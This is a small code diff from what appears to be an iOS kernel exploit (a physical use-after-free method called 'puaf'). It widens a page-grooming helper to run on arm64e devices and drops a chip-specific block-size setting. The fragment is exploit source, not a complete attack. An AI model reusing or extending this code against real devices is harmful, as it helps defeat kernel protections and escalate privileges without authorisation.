@@ -59,7 +59,7 @@ void puaf_init(struct kfd* kfd, uint64_t exploit_type)
 
 void puaf_run(struct kfd* kfd)
 {
-    if(kfd->info.env.vid != 0)
+    if(kfd->info.env.vid != 0 || isarm64e())
         puaf_helper_give_ppl_pages();
     
     kfd->puaf.puaf_method_ops.run(kfd);
@@ -133,9 +133,6 @@ void puaf_helper_give_ppl_pages(void)
 {
     const uint64_t given_ppl_pages_max = 10000;
     uint64_t l2_block_size = 0x2000000;
-    if(ischip() == 7) {
-        l2_block_size = 0x200000;
-    }
 
     vm_address_t addresses[given_ppl_pages_max] = {};
     vm_address_t address = 0;
